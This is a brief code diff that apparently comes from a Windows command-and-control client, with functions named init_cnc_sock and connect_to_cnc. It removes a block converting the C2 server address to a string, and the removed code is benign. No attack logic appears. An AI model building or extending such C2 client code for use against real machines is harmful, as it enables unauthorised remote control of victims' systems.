@@ -66,16 +66,6 @@ void init_cnc_sock()
 void connect_to_cnc(struct addrinfo *cnc_addrinfo)
 {
     int ret;
-    char cnc_addr[255];
-    long unsigned int cnc_addr_len = sizeof(cnc_addr);
-
-    ret = WSAAddressToStringA(cnc_addrinfo->ai_addr, cnc_addrinfo->ai_addrlen, NULL, cnc_addr, &cnc_addr_len);
-    if (ret)
-    {
-        log_error("WSAAddressToStringA failed: %d\n", ret);
-        WSACleanup();
-        exit(EXIT_FAILURE);
-    }
 
     while (TRUE)
     {
